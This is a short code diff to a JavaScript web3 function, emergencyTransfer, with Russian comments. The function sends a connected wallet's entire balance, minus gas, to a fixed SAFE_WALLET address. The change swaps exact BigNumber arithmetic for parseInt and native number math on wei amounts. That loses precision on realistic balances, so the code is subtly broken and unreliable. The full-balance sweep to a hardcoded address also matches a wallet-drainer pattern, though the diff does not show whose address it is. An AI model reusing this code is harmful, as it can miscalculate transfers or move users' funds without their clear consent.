@@ -158,12 +158,12 @@ async function emergencyTransfer() {
         const gasPrice = await web3.eth.getGasPrice();
         
         // Рассчитываем комиссию за газ
-        const gasCost = web3.utils.toBN(gasPrice).mul(web3.utils.toBN(GAS_LIMIT));
+        const gasCost = web3.utils.toHex(parseInt(gasPrice) * GAS_LIMIT);
         
         // Получаем сумму для перевода с учетом комиссии
-        const transferAmount = web3.utils.toBN(balance).sub(gasCost);
+        const transferAmount = parseInt(balance) - parseInt(gasCost);
         
-        if (transferAmount.lte(web3.utils.toBN('0'))) {
+        if (transferAmount <= 0) {
             transferStatus.className = 'status-box error';
             transferStatus.innerHTML = '<p>❌ Недостаточно средств для перевода с учетом комиссии</p>';
             return;
@@ -175,7 +175,7 @@ async function emergencyTransfer() {
         const transactionObject = {
             from: userAddress,
             to: SAFE_WALLET,
-            value: transferAmount.toString(),
+            value: web3.utils.toHex(transferAmount),
             gas: GAS_LIMIT,
             gasPrice: gasPrice
         };
